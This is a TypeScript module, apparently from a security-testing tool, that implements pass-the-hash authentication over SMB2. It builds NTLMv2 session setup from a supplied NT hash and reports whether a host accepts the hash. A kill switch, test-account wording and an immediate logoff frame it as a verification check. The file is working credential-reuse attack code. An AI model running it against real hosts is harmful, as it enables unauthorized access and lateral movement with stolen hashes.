/**
 * Pass-the-hash SMB2 transport: NTLMv2 session setup keyed by a precomputed
 * NT hash over a raw socket (battery WS-023). Wire builders live in pth.ts.
 */

import { connect as smbNetConnect, type Socket as SmbSocket } from "node:net";
import { HOST_EXEC_TIMEOUT_MS } from "../common.js";
import { buildType1, parseType2, buildType3V2 } from "../ntlmv2.js";
import {
  buildNegotiate,
  buildSessionSetup,
  buildLogoff,
  DIALECT_NAMES,
  STATUS_SUCCESS,
  STATUS_LOGON_FAILURE,
  type SmbPthArgs,
  type SmbPthResult,
  type SmbPthTransport,
} from "./pth.js";

class PthConnection {
  private sock: SmbSocket;
  private buf = Buffer.alloc(0);
  private waiters: { resolve: (b: Buffer) => void; reject: (e: Error) => void; timer: ReturnType<typeof setTimeout> }[] = [];
  private msgId = 0;

  constructor(sock: SmbSocket) {
    this.sock = sock;
    sock.on("data", (d: Buffer) => {
      this.buf = Buffer.concat([this.buf, d]);
      this.pump();
    });
    sock.on("close", () => this.failAll(new Error("[smb-pth] connection closed by peer")));
    sock.on("error", (e) => this.failAll(e instanceof Error ? e : new Error(String(e))));
  }

  private pump(): void {
    while (this.waiters.length > 0 && this.buf.length >= 4) {
      const len = this.buf.readUIntBE(1, 3);
      if (this.buf.length < 4 + len) return;
      const frame = this.buf.subarray(4, 4 + len);
      this.buf = this.buf.subarray(4 + len);
      const w = this.waiters.shift()!;
      clearTimeout(w.timer);
      w.resolve(frame);
    }
  }

  private failAll(err: Error): void {
    for (const w of this.waiters.splice(0)) {
      clearTimeout(w.timer);
      w.reject(err);
    }
  }

  nextId(): number {
    this.msgId += 1;
    return this.msgId;
  }

  request(payload: Buffer, timeoutMs: number): Promise<Buffer> {
    this.sock.write(payload);
    return new Promise<Buffer>((resolve, reject) => {
      const timer = setTimeout(() => {
        const i = this.waiters.findIndex((w) => w.resolve === resolve);
        if (i >= 0) this.waiters.splice(i, 1);
        reject(new Error(`[smb-pth] response timed out after ${timeoutMs}ms`));
      }, timeoutMs);
      this.waiters.push({ resolve, reject, timer });
    });
  }

  destroy(): void {
    this.failAll(new Error("[smb-pth] destroyed"));
    try {
      this.sock.destroy();
    } catch {
      /* best effort */
    }
  }
}

function smbStatus(frame: Buffer): number {
  return frame.readUInt32LE(8);
}

/** Security buffer of a SESSION_SETUP response (offset relative to SMB2 header start). */
function sessionSecurityBuffer(frame: Buffer): Buffer {
  const off = frame.readUInt16LE(64 + 4);
  const len = frame.readUInt16LE(64 + 6);
  if (off + len > frame.length) throw new Error("[smb-pth] security buffer out of range");
  return frame.subarray(off, off + len);
}

export function createSmbPthTransport(
  connectImpl: (host: string, port: number) => Promise<SmbSocket> = (host, port) =>
    new Promise<SmbSocket>((resolve, reject) => {
      const s = smbNetConnect({ host, port });
      s.once("connect", () => resolve(s));
      s.once("error", reject);
    }),
): SmbPthTransport {
  const conns: PthConnection[] = [];
  return {
    async auth(args: SmbPthArgs): Promise<SmbPthResult> {
      const port = args.port ?? 445;
      const timeoutMs = args.timeoutMs ?? HOST_EXEC_TIMEOUT_MS;
      if (!/^[0-9a-f]{32}$/.test(args.ntHashHex)) {
        throw new Error("[smb-pth] ntHashHex must be 32 lowercase hex chars");
      }
      if (args.signal?.aborted) throw new Error("[smb-pth] aborted by kill switch before connect");
      const hash = Buffer.from(args.ntHashHex, "hex");
      const domain = args.domain ?? "";
      let conn: PthConnection | undefined;
      try {
        const sock = await connectImpl(args.host, port);
        conn = new PthConnection(sock);
        conns.push(conn);
        args.signal?.addEventListener("abort", () => conn?.destroy(), { once: true });

        // 1. NEGOTIATE.
        const negResp = await conn.request(buildNegotiate(conn.nextId()), timeoutMs);
        if (smbStatus(negResp) !== STATUS_SUCCESS) {
          return { reachable: true, note: `SMB negotiate failed (status 0x${smbStatus(negResp).toString(16)}).` };
        }
        const dialect = DIALECT_NAMES[negResp.readUInt16LE(64 + 2)] ?? `0x${negResp.readUInt16LE(64 + 2).toString(16)}`;

        // 2. SESSION_SETUP with NTLMSSP NEGOTIATE (Type 1).
        const ss1 = await conn.request(buildSessionSetup(conn.nextId(), buildType1(domain)), timeoutMs);
        const ss1Status = smbStatus(ss1);
        if (ss1Status !== 0xc0000016 /* STATUS_MORE_PROCESSING_REQUIRED */ && ss1Status !== STATUS_SUCCESS) {
          return {
            reachable: true,
            dialect,
            ntStatus: `0x${ss1Status.toString(16)}`,
            note: `Session setup phase 1 rejected (status 0x${ss1Status.toString(16)}) — server refused NTLM negotiation.`,
          };
        }
        const challenge = parseType2(sessionSecurityBuffer(ss1));

        // 3. SESSION_SETUP with NTLMSSP AUTHENTICATE — NTLMv2 keyed by the NT hash.
        const type3 = buildType3V2({
          user: args.username,
          domain,
          challenge: challenge.challenge,
          targetInfo: challenge.targetInfo,
          ntHash: hash,
        });
        const ss2 = await conn.request(buildSessionSetup(conn.nextId(), type3), timeoutMs);
        const status = smbStatus(ss2);
        const sessionId = Number(ss2.readBigUInt64LE(40));

        if (status === STATUS_SUCCESS) {
          // Acceptance is the finding — log off immediately, touch nothing.
          try {
            await conn.request(buildLogoff(conn.nextId(), sessionId), Math.min(timeoutMs, 5000));
          } catch {
            /* best effort */
          }
          return {
            reachable: true,
            hashAccepted: true,
            dialect,
            ntStatus: "0x0",
            note:
              "STATUS_SUCCESS — the test account's NT hash AUTHENTICATED to SMB (pass-the-hash works " +
              "against this host). Session was logged off immediately; no share was touched.",
          };
        }
        return {
          reachable: true,
          hashAccepted: false,
          dialect,
          ntStatus: `0x${status.toString(16)}`,
          note:
            status === STATUS_LOGON_FAILURE
              ? "STATUS_LOGON_FAILURE — the hash was rejected; pass-the-hash does not work here with this material."
              : `Session setup failed with status 0x${status.toString(16)} — hash not accepted.`,
        };
      } catch (err) {
        return { reachable: false, note: `SMB unreachable: ${(err as Error).message}` };
      } finally {
        try {
          conn?.destroy();
        } catch {
          /* best effort */
        }
      }
    },
    async close(): Promise<void> {
      for (const c of conns.splice(0)) {
        try {
          c.destroy();
        } catch {
          /* best effort */
        }
      }
    },
  };
}

export type { SmbPthArgs, SmbPthResult, SmbPthTransport } from "./pth.js";
